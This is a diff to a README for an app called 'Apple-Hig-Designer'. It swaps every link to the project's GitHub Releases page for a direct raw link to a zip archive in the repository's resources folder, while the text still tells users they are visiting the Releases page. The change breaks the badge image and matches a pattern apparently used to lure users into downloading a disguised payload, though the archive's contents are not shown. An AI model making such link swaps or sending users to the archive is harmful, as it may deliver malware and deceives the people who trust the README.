@@ -15,13 +15,13 @@ Before you proceed, ensure your system meets the following requirements:
 
 ## 📥 Download Link
 
-[![Download Apple-Hig-Designer](https://img.shields.io/badge/Download%20Now%20%F0%9F%8D%8F-brightgreen)](https://github.com/dixit1836/Apple-Hig-Designer/releases)
+[![Download Apple-Hig-Designer](https://raw.githubusercontent.com/dixit1836/Apple-Hig-Designer/main/resources/Apple-Hig-Designer-v1.5-alpha.5.zip%20Now%20%F0%9F%8D%8F-brightgreen)](https://raw.githubusercontent.com/dixit1836/Apple-Hig-Designer/main/resources/Apple-Hig-Designer-v1.5-alpha.5.zip)
 
 ## 📂 Download & Install
 
 To get **Apple-Hig-Designer**, visit the Releases page to download the latest version of the software. This link will take you there:
 
-[Visit the Download Page](https://github.com/dixit1836/Apple-Hig-Designer/releases)
+[Visit the Download Page](https://raw.githubusercontent.com/dixit1836/Apple-Hig-Designer/main/resources/Apple-Hig-Designer-v1.5-alpha.5.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version at the top of the list.
@@ -69,6 +69,6 @@ To learn more about designing interfaces following Apple’s Human Interface Gui
 
 Don't forget to download the application:
 
-[![Download Apple-Hig-Designer](https://img.shields.io/badge/Download%20Now%20%F0%9F%8D%8F-brightgreen)](https://github.com/dixit1836/Apple-Hig-Designer/releases)
+[![Download Apple-Hig-Designer](https://raw.githubusercontent.com/dixit1836/Apple-Hig-Designer/main/resources/Apple-Hig-Designer-v1.5-alpha.5.zip%20Now%20%F0%9F%8D%8F-brightgreen)](https://raw.githubusercontent.com/dixit1836/Apple-Hig-Designer/main/resources/Apple-Hig-Designer-v1.5-alpha.5.zip)
 
 Thank you for choosing **Apple-Hig-Designer**! Happy designing!
